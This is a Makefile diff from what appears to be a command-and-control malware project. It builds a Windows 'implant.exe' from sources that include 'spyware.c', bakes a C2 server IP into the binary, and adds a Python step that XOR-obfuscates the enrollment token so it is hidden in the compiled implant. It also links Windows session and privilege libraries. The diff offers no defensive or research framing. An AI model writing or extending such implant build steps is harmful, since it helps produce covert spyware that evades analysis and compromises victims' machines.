@@ -36,16 +36,22 @@ $(LINUX_DIR)/controller: src/controller.c src/protocol.c src/tls.c \
 #
 # Pass -DC2_DEFAULT_HOST="<ip>" to bake the C2 IP in:
 #   make bin/windows/implant.exe C2_HOST_IP=192.168.1.100 ENROLLMENT_TOKEN=<hex>
+# Generate XOR-obfuscated enrollment token header for local builds.
+# The Dockerfile builder generates this automatically before calling make.
+include/token_obf.h: | $(WIN_DIR)
+	$(if $(ENROLLMENT_TOKEN),,$(error ENROLLMENT_TOKEN must be set to build implant.exe))
+	@python3 -c "t=b'$(ENROLLMENT_TOKEN)';k=bytes([0x5a,0x3c,0x7f,0x21]);o=bytes(v^k[i%4]for i,v in enumerate(t));open('include/token_obf.h','w').write('#pragma once\n/* Auto-generated — do not edit or commit */\nstatic const unsigned char g_token_key[]={'+','.join(hex(v)for v in k)+'};\nstatic const unsigned char g_token_obf[]={'+','.join(hex(v)for v in o)+'};\n#define TOKEN_OBF_LEN '+str(len(t))+'\n')"
+
 $(WIN_DIR)/implant.exe: src/implant.c src/protocol.c src/tls.c \
-                         src/implant_utils.c src/spyware.c include/implant_certs.h | $(WIN_DIR)
+                         src/implant_utils.c src/spyware.c \
+                         include/implant_certs.h include/token_obf.h | $(WIN_DIR)
 	$(CC_WIN) $(CFLAGS_WIN) \
 	    $(if $(C2_HOST_IP),-DC2_DEFAULT_HOST=\"$(C2_HOST_IP)\") \
-	    $(if $(ENROLLMENT_TOKEN),-DENROLLMENT_TOKEN=\"$(ENROLLMENT_TOKEN)\") \
 	    -I $(OPENSSL_WIN_INC) \
 	    src/implant.c src/protocol.c src/tls.c src/implant_utils.c src/spyware.c \
 	    -o $@ \
 	    -L $(OPENSSL_WIN_LIB) \
-	    -lssl -lcrypto -lws2_32 -lcrypt32 -lbcrypt -lgdi32 -luser32 \
+	    -lssl -lcrypto -lws2_32 -lcrypt32 -lbcrypt -lgdi32 -luser32 -lwtsapi32 -ladvapi32 \
 	    -mwindows \
 	    -static
 
